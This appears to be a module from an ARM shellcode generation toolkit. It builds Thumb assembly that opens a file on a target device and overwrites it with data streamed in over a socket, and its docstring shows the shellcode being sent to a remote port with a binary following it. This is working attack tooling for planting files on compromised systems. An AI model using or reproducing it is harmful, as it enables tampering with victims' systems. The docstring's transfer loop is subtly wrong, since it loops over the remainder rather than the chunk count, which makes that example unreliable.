# overwrites a file with user's data

import open_file
import read_from_stack
import write_to_stack

O_RDONLY = 0x0
O_WRONLY = 0x1
O_RDWR   = 0x2
MAXSIZE  = 128

def generate(filepath, sock):
    """overwrites a file with user's data

    argument:
        filepath (str)    : file name to open
        sock (int/str/reg): read a sock to write data

    example for sending a big file to remote to write

    HOST = 'hostname'
    PORT = 31337
    MAXSIZE = 128

    sc  = scgen.overwrite('./binary', 4)
    sc += scgen.exit(0)
    xsc = CompileSC( (sc), isThumb=True)

    s = socket(AF_INET, SOCK_STREAM)
    s.connect( (HOST, PORT) )
    f = s.makefile('rw', bufsize=0)
    f.write(xsc + '\n')
    data = open('/path/to/binary', 'rb').read()

    size = len(data)
    mod  = size % MAXSIZE
    for i in range(0, mod):
        f.write(data[i*128:(i+1)*MAXSIZE])
        f.write(data[mod*MAXSIZE:])
    """

    sc = open_file.generate(filepath, O_RDWR)
    sc += """
loop_1:
    """
    sc += write_to_stack.generate(sock, MAXSIZE)
    sc += """
    mov r5, r0
    """
    sc += read_from_stack.generate('r6', 'r0')

    sc += """
    cmp r5, #%s
    beq loop_1
    """ % (MAXSIZE)

    return sc
